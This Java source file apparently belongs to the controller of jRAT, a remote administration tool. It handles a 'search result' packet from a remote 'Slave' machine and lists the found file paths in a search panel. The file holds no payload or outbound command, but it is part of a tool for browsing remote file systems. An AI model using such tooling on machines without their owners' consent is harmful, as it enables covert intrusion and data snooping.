package jrat.module.fs.packets;

import iconlib.FileIconUtils;
import jrat.controller.Slave;
import jrat.controller.packets.incoming.IncomingPacket;
import jrat.module.fs.ui.PanelFileSystem;
import jrat.module.fs.ui.PanelSearchFiles;

import javax.swing.*;

public class Packet37SearchResult implements IncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String path = slave.readLine();
		String name = slave.readLine();
		boolean dir = slave.readBoolean();

		PanelFileSystem frame = (PanelFileSystem) slave.getPanel(PanelFileSystem.class);

		if (frame != null) {
			PanelSearchFiles panel = frame.getSearchPanel();
			panel.getRenderer().icons.put(path, (ImageIcon) FileIconUtils.getIconFromExtension(name, dir));
			panel.getModel().addRow(new Object[] { path, name });
		}
	}
}
